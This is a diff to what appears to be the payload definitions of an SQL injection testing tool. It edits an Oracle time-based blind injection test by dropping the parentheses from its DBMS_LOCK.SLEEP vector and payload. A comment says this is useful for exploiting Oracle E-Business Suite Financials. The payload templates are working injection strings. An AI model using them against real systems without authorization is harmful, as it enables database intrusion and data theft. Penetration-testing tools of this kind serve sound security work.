@@ -3324,6 +3324,7 @@ Formats:
         </details>
     </test>
 
+    <!-- Without parentesis because it never works with them, useful to exploit SQL injection in Oracle E-Business Suite Financials -->
     <test>
         <title>Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)</title>
         <stype>5</stype>
@@ -3331,9 +3332,9 @@ Formats:
         <risk>0</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE [RANDNUM]; END IF; END)</vector>
+        <vector>BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END</vector>
         <request>
-            <payload>(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE [RANDNUM]; END IF; END)</payload>
+            <payload>BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
